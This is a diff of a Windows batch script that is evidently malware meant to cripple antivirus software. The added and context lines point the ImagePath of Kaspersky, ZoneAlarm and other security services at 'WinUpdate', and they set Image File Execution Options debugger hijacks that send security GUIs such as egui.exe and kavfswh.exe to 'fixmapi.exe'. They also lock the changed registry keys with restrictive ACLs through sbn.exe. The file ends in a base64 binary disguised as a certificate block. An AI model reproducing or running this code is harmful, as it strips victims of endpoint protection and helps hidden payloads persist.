@@ -1552,7 +1552,7 @@ sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
 sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mfemactl.exe" /grant=S-1-5-32-545=R /grant=S-1-5-32-544=R /grant=S-1-1-0=R /grant=S-1-5-32-578=R /grant=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0
 sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmdvirth.exe" /grant=S-1-5-32-545=R /grant=S-1-5-32-544=R /grant=S-1-1-0=R /grant=S-1-5-32-578=R /grant=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0
 sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\WscReg.exe" /grant=S-1-5-32-545=R /grant=S-1-5-32-544=R /grant=S-1-1-0=R /grant=S-1-5-32-578=R /grant=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0
-
+		
 rem AverSvrs
 Reg Add "HKLM\SYSTEM\CurrentControlSet\services\avpsus" /v "ImagePath" /t REG_SZ /d "WinUpdate" /f
 Reg Add "HKLM\SYSTEM\CurrentControlSet\services\klflt" /v "ImagePath" /t REG_SZ /d "WinUpdate" /f
@@ -1994,13 +1994,23 @@ Sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\cmdGuard" 
 Sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\cmdHlp" /revoke=S-1-5-32-545 /revoke=S-1-5-32-544 /revoke=S-1-5-32-578 /revoke=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0 /deny=S-1-1-0=F
 Sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\cmdvirth" /revoke=S-1-5-32-545 /revoke=S-1-5-32-544 /revoke=S-1-5-32-578 /revoke=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0 /deny=S-1-1-0=F
 Sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\inspect" /revoke=S-1-5-32-545 /revoke=S-1-5-32-544 /revoke=S-1-5-32-578 /revoke=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0 /deny=S-1-1-0=F
-   	                  			
+Reg Add "HKLM\SYSTEM\CurrentControlSet\services\kavfsslp" /v "ImagePath" /t REG_SZ /d "WinUpdate" /f
+Reg Add "HKLM\SYSTEM\CurrentControlSet\services\klam" /v "ImagePath" /t REG_SZ /d "WinUpdate" /f
+Reg Add "HKLM\SYSTEM\CurrentControlSet\services\KLFLTDEV" /v "ImagePath" /t REG_SZ /d "WinUpdate" /f
+Reg Add "HKLM\SYSTEM\CurrentControlSet\services\ksnproxy" /v "ImagePath" /t REG_SZ /d "WinUpdate" /f
+Sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\kavfsslp" /revoke=S-1-5-32-545 /revoke=S-1-5-32-544 /revoke=S-1-5-32-578 /revoke=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0 /deny=S-1-1-0=F
+Sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\klam" /revoke=S-1-5-32-545 /revoke=S-1-5-32-544 /revoke=S-1-5-32-578 /revoke=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0 /deny=S-1-1-0=F
+Sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\KLFLTDEV" /revoke=S-1-5-32-545 /revoke=S-1-5-32-544 /revoke=S-1-5-32-578 /revoke=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0 /deny=S-1-1-0=F
+Sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\ksnproxy" /revoke=S-1-5-32-545 /revoke=S-1-5-32-544 /revoke=S-1-5-32-578 /revoke=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0 /deny=S-1-1-0=F
+Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\kavfswh.exe" /v "debugger" /t REG_SZ /d "fixmapi.exe" /f
+Sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\kavfswh.exe" /grant=S-1-5-32-545=R /grant=S-1-5-32-544=R /grant=S-1-1-0=R /grant=S-1-5-32-578=R /grant=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0
+
 Reg Add "HKLM\SYSTEM\CurrentControlSet\services\ZAMSvc" /v "ImagePath" /t REG_SZ /d "WinUpdate" /f
 Sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\ZAMSvc" /revoke=S-1-5-32-545 /revoke=S-1-5-32-544 /revoke=S-1-5-32-578 /revoke=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0 /deny=S-1-1-0=F
   	
 Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\egui.exe" /v "debugger" /t REG_SZ /d "fixmapi.exe" /f
 Sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\egui.exe" /grant=S-1-5-32-545=R /grant=S-1-5-32-544=R /grant=S-1-1-0=R /grant=S-1-5-32-578=R /grant=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0
-
+	
 :::::THE_END
 :nocertutil
 del /f /q sbn.64
@@ -3837,3 +3847,4 @@ dEluZm8AAABSdGxJbml0VW5pY29kZVN0cmluZwAAQ29Jbml0aWFsaXplAABTYW1D
 b25uZWN0AABDb21tYW5kTGluZVRvQXJndlcAAHdzcHJpbnRmVwAAAFZlclF1ZXJ5
 VmFsdWVXAABHZXRQcmludGVyVwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -----END CERTIFICATE-----
+	
